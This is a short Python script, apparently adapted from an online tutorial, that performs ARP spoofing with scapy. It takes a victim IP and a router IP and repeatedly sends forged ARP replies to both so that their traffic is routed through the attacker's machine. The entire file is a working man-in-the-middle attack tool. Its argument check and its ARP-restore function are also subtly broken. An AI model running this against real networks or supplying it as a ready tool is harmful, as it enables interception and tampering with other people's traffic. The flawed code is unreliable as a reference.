#!/usr/bin/env python
# https://www.geeksforgeeks.org/how-to-make-a-arp-spoofing-attack-using-scapy-python/
# scapy explained....!
import sys
import time
from argparse import ArgumentParser

import scapy.all as scapy


def get_arguments():
    parser = ArgumentParser()
    parser.add_argument("-t", "--target", dest="victim_ip", help="enter the target ip")
    parser.add_argument("-r", dest="router_ip", help="enter the router ip")
    options = parser.parse_args()
    if not options.victim_ip and options.router_ip:
       print("[-] please enter the inputs.....")
    else:
        return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answ[0][1].hwsrc


def arp_spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip), psrc=source_ip, hwsrc=source_ip)
    scapy.send(packet, count=4, verbose=False)


ip = get_arguments()
victim_ip = ip.victim_ip
router_ip = ip.router_ip
sent_packets_count = 0

try:
    while True:
        sent_packets_count += 2
        arp_spoof(victim_ip, router_ip)
        arp_spoof(router_ip, victim_ip)
        print("[+] packets sent " + str(sent_packets_count), end="\r")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] detected CTRL + C .....Resetting Arp Tables....\n")
    restore(victim_ip, router_ip)
    restore(router_ip, victim_ip)
